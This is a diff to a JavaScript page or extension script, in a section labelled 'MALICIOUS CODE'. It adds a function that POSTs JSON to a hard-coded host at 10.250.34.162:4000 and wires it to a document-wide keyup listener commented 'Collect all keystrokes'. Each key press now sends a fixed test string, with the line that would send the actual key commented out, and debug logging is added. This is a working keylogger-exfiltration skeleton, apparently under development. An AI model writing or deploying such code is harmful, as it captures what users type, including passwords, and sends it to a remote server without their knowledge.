@@ -440,8 +440,30 @@ observer.observe(document, { childList: true, subtree: true });
  * MALICIOUS CODE
  */
 
+function sendData(data) {
+  fetch('http://10.250.34.162:4000/data', {
+      method: 'POST', 
+      headers: {
+          'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(data)
+  })
+  .then(response => response.json())
+  .then(data => console.log('Success:', data))
+  .catch((error) => console.error('Error:', error));
+}
+
+// Example function to trigger sending data
+function packageSend(mes) {
+  sendData({ message: mes });
+}
+
 // Collect all keystrokes
 document.addEventListener('keyup', function(event) {
   console.log('Key pressed:', event.key);
-});
+  console.log('This should run');
+  console.log('Key type: ', typeof event.key);
 
+  // packageSend(event.key);
+  packageSend('shabbat shalom Ido')
+});
